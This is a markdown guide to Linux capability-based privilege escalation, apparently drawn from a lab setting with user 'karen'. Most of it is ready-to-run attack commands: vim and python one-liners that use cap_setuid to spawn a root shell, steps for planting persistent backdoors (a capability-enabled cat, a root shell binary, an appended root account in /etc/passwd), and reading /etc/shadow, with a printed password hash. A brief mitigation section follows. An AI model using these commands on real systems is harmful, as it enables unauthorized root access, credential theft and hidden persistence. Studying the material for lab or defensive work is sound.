# **Linux Capabilities Privilege Escalation Guide**

## **1. Identifying Dangerous Capabilities**
```bash
# Find all files with capabilities
getcap -r / 2>/dev/null

# Example findings:
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep  # <-- Most interesting!
```

## **2. Exploiting `cap_setuid` on Vim**
### **Method 1: Python3 Payload**
```bash
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
- **Result**: Drops you into a root shell (`uid=0`)

### **Method 2: GTFOBins One-Liner**
```bash
./vim -c ':lua os.execute("su root")'
```

## **3. Creating Persistent Backdoors**
### **A. Create a Capability-Enabled Cat**
```bash
# As root:
cp /bin/cat /home/karen/supercat
setcap CAP_DAC_READ_SEARCH=+ep /home/karen/supercat

# As normal user:
/home/karen/supercat /etc/shadow  # Now works!
```

### **B. Make a Root Shell Generator**
```bash
echo -e '#!/bin/sh\n/bin/bash -p' > /home/karen/rootshell
chmod +x /home/karen/rootshell
setcap cap_setuid+ep /home/karen/rootshell
```

## **4. Critical Capabilities to Exploit**
| Capability | Effect | Example Exploit |
|------------|--------|-----------------|
| `cap_setuid` | Change UID | `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_dac_read_search` | Bypass file read perms | `cat /etc/shadow` |
| `cap_dac_override` | Bypass all file perms | `vim /etc/passwd` |
| `cap_net_bind_service` | Bind to low ports | `nc -lvp 80` |

## **5. Defense & Mitigation**
```bash
# Remove dangerous capabilities
setcap -r /path/to/binary

# Find all setuid binaries
find / -perm -4000 -type f 2>/dev/null

# Audit capabilities regularly
getcap -r / 2>/dev/null > /var/log/capabilities.log
```

## **6. Real-World Examples**
### **Reading Protected Files**
```bash
$ getcap /home/karen/supercat
/home/karen/supercat = cap_dac_read_search+ep

$ /home/karen/supercat /etc/shadow
root:*:18561:0:99999:7:::
karen:$6$4eGstEUvk4plAj.1$BCRZBB8lHIKa8jY0K5V5g43C4N.5gE55BtI343nn6RXHaxKfB7vDeUSSkXSKLexoaawuB1ddy6WKb/W3PXt9A0:18796:0:99999:7:::
```

### **Creating New Root User**
```bash
# After getting root via vim:
echo "backdoor:\$6\$salt\$hash:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## **7. Reference Table: Dangerous Capabilities**
| Capability | Risk | Common Binaries |
|------------|------|-----------------|
| `CAP_SETUID` | Root access | Vim, Python, Perl |
| `CAP_DAC_OVERRIDE` | Read/write any file | Cat, Less |
| `CAP_NET_RAW` | Network sniffing | Ping, Tcpdump |
| `CAP_SYS_ADMIN` | Mount/namespace ops | Mount, Unshare |

**Pro Tip**: Always check for custom binaries in home directories with `getcap`! These are often overlooked by admins.
